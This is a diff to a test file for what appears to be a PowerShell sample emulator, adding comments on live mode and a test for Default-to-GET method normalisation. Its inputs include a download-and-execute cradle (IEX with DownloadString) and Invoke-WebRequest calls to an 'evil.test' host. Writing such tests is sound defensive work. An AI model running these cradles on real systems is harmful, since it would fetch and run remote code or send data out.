@@ -224,6 +224,14 @@ check(
   JSON.stringify(outcomes(o).slice(-3)),
 );
 
+// The live path, exercised here and nowhere else.
+//
+// These run on the page's main thread, which tolerates a synchronous request.
+// The engine in the product runs in a worker, where the same request kills the
+// worker outright - found by an e2e check, reproduced with a control run, and
+// the reason no live control is offered in the UI. So treat these two as
+// covering the resolver's branching, not as evidence that live mode is usable.
+//
 // Live mode works where the server allows a cross-origin read...
 o = await run("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:4231/s.ps1')", [], "live");
 check(
@@ -260,6 +268,15 @@ o = await run("Invoke-WebRequest -Uri 'http://evil.test/p' -Method POST", [["p",
 check(
   "method: a POST is recorded as POST",
   outcomes(o).includes("POST"),
+  JSON.stringify(outcomes(o)),
+);
+
+// PowerShell maps WebRequestMethod.Default onto GET, so a sample using
+// `-Method Default` must not be reported as a DEFAULT verb or send one.
+o = await run("Invoke-WebRequest -Uri 'http://evil.test/d' -Method Default", [["d", "x"]]);
+check(
+  "method: Default is normalised to GET",
+  outcomes(o).includes("GET") && !outcomes(o).includes("DEFAULT"),
   JSON.stringify(outcomes(o)),
 );
 
